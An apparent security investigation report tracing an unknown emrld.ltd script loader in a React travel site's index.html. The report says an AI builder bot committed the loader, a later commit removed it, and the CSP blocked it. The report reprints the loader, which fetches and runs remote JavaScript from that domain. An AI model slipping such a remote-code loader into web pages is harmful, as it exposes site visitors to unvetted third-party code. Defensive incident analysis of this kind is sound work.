# `emrld.ltd` Script Injection — Investigation

**Date:** 2026-06-08
**Repo:** `kimlainchhorng/zivosmedia`
**Scope:** Live audit flagged `https://emrld.ltd/NDkzNzQ1.js?t=493745` loading (and being CSP-blocked) on `/flights`, `/hotels`, `/cars`. Task: find the source. Investigation only — no blind removal.

---

## TL;DR

- **`emrld.ltd` is NOT an edge/CDN/hosting injection.** It was **first-party application code** — an inline `<script>` loader committed in **`index.html`** (and a stray duplicate, `eloquent-liskov-159913/index.html`).
- **It was introduced by the Lovable AI builder bot** (`gpt-engineer-app[bot]`) on **2026-01-30**, in a vague `"Changes"` commit (`719088f95`).
- **It has ALREADY been removed from `main`** — commit `365f08ca5` *"Add Zivo host pages and configs; remove tracker"* deleted the loader (and the CSP allowlist entry) from both `index.html` and the duplicate. `origin/main:index.html` now has **zero** `emrld` references.
- **It still appears in LIVE HTML because of deployment lag** — the deployed build predates the removal. The runtime CSP (header-level, from `public/_headers` / `netlify.toml`, which never allowlisted `emrld.ltd`) correctly **blocked** it, so the remote script never executed.
- **Primary fix = redeploy current `main`.** No further source change is required for `main`; but several **stale feature branches still carry the loader** and must not be merged without dropping it.

---

## 1. Does `emrld.ltd` exist in the repo?

**Yes — it was committed source, now removed from `main`.**

| Location | State on `main` |
|----------|-----------------|
| `index.html` (inline loader + meta-CSP allowlist entry) | ✅ **Removed** (commit `365f08ca5`) — 0 references |
| `eloquent-liskov-159913/index.html` (stray duplicate) | ✅ **Removed** — 0 references (file still exists, loader gone) |
| `docs/*` (audit findings), `docs/screenshots/*.html` (captured **live** HTML), `scripts/tmp-audit-results.json` | Present as **evidence/records only** — not executable app code |

### The injected loader (recovered from a branch that still carries it)

```html
<!-- Deferred non-critical scripts -->
<script defer data-noptimize="1" data-cfasync="false" data-wpfc-render="false">
  (function () {
    var script = document.createElement("script");
    script.async = 1;
    script.src = 'https://emrld.ltd/NDkzNzQ1.js?t=493745';
    document.head.appendChild(script);
  })();
</script>
```

**Why this looks like an unvetted third-party / monetization snippet (not a deliberate first-party integration):**
- `data-cfasync="false"` (tells **Cloudflare Rocket Loader** to skip it), `data-wpfc-render="false"` (**WP Fastest Cache**), `data-noptimize="1"` (**Autoptimize**) — these are classic **copy-paste markers from WordPress/affiliate/monetization providers**, irrelevant to a Vite/React app. Their presence means the snippet was pasted from an external source, not authored for this codebase.
- The src path `NDkzNzQ1.js` is opaque (`NDkzNzQ1` is base64 for `493745`; also echoed in `?t=493745`). Contrast with the clearly-named `gtag` / Facebook / TikTok / AdSense loaders elsewhere in `index.html`. `emrld.ltd` is not a recognizable analytics/ads vendor.
- On the version that added it, the author **also added `https://emrld.ltd` to the meta-tag CSP allowlist** (`script-src` + `connect-src`) — i.e. it was meant to actually run.

## 2. Does it appear only in live HTML?

**No — it was in committed source, and now appears only in:** (a) **live HTML** (deployed pre-removal build), and (b) repo **records** of that live HTML (`docs/screenshots/*.com.html`) and audit notes. The live appearance is a **stale deploy**, not an active edge injection.

## 3. Likely source

| Candidate | Verdict |
|-----------|---------|
| **First-party committed `index.html`** | ✅ **CONFIRMED SOURCE** — inline IIFE loader, added by Lovable bot `gpt-engineer-app[bot]` 2026-01-30 (`719088f95`) |
| Cloudflare (Zaraz / Snippets / Workers / Transform Rules / Apps / Rocket Loader) | ❌ Ruled out — `emrld` is in **no** `*.toml` / `wrangler*` / worker / functions config |
| Netlify (snippet injection / post-processing / `_headers`) | ❌ Ruled out — not in `netlify.toml` / `public/_headers` (those CSPs *block* it) |
| Lovable (builder-injected) | ⚠️ **Origin vector** — the bot that committed it is Lovable's `gpt-engineer-app[bot]`; likely pulled in via an AI prompt/template, not a named integration |
| Tag manager (GTM) | ❌ Not the path — GTM exists in `index.html` for other analytics, but `emrld` loaded via the direct inline IIFE, not a GTM tag |
| Compromised dependency / edge actor | ❌ Ruled out — it was literal committed HTML |

**Conclusion: unvetted third-party script shipped in first-party source via the Lovable builder.** Treat as a **near-miss supply-chain / unwanted-script** incident. Because the header-level CSP blocked it on production, the remote `NDkzNzQ1.js` was **never fetched/executed** on the audited live site — no known data exfiltration.

## 4. Exact manual dashboard places the owner must check

Root cause is in-source and already removed, but verify there is **no second injection path** and that the site is correctly served:

- **Netlify** (primary host): *Deploys* → confirm a **redeploy of current `main`** is pending/needed; *Site configuration → Build & deploy → Post processing / Snippet injection* → confirm **no** custom `<head>`/`<body>` snippet adds `emrld`.
- **Cloudflare** (DNS/proxy, if fronting the site): *Zaraz* (third-party tools), *Rules → Transform Rules (HTTP Response / HTML rewrite)*, *Snippets*, *Workers & Pages / Workers Routes*, *Apps* (legacy), *Speed → Optimization → Rocket Loader* — confirm none inject `emrld`.
- **Lovable** (builder): project *Settings* → custom code / analytics / tracking injection, integrations, and published-site head/body scripts → confirm `emrld` is not configured there (and review other `gpt-engineer-app[bot]` "Changes" commits for similar pasted scripts).
- **Google Tag Manager** (a container is referenced in `index.html`): open the container → confirm no **Custom HTML** tag loads `emrld.ltd`.
- **Domain registrar / DNS**: confirm `emrld.ltd` is not a configured subdomain/integration of any zivo domain.

## 5. Recommended fix / action

1. **Redeploy current `main` to production (Netlify).** This is the actual fix for the live finding — the source is already clean on `main` (`365f08ca5`), so the live HTML drops the loader on next deploy. *(No new code change needed for `main`.)*
2. **Keep the header-level CSP without `emrld.ltd`** (`public/_headers`, `netlify.toml`) — it is the safety net and is already correct. Do not add `emrld.ltd` to any CSP allowlist.
3. **Clean stale feature branches** that still carry the loader before they can merge and re-introduce it (rebase onto post-`365f08ca5` `main` or strip the block). Branches confirmed still carrying it include:
   `backup/main-991e499d3-20260528`, `chore/security-major-upgrades`, `claude/chat-reactions-popover`, `claude/silly-lamport-0533b5`, `claude/zivo-service-pipeline-eta-tracker`, `codex/chat-outbox-retry-polish`, `codex/csp-report-domain-routing`, `codex/group-chat-polish`, `codex/group-stars-locked-media`, `codex/trending-compact-pulse` (and likely other pre-2026-01-30-base branches).
4. **Provenance review (security hygiene):** because this entered via the Lovable bot, audit other `gpt-engineer-app[bot]` commits for additional unrecognized third-party `<script>` includes. Document this as a near-miss; no exfiltration occurred (CSP-blocked on live).
5. **Optional defense-in-depth:** add a CI/lint check (or a `wiring-check` rule) that fails the build if `index.html` references a non-allowlisted external script origin, preventing silent re-introduction.

---

### Evidence appendix (commands)

- `git grep -i emrld origin/main` → matches only in `docs/`, `docs/screenshots/*.html`, `scripts/tmp-audit-results.json` (records); **none in `origin/main:index.html`**.
- `git log --all --reverse -S 'emrld.ltd' -- index.html` → first add `719088f95` (`gpt-engineer-app[bot]`, 2026-01-30).
- `git show 365f08ca5 --stat` → removed 25 lines each from `index.html` and `eloquent-liskov-159913/index.html` ("remove tracker").
- `git merge-base --is-ancestor 365f08ca5 origin/main` → true (removal is on `main`).
- `git grep -c -i emrld origin/main -- public/_headers` → `0` (header CSP never allowlisted it → live block).
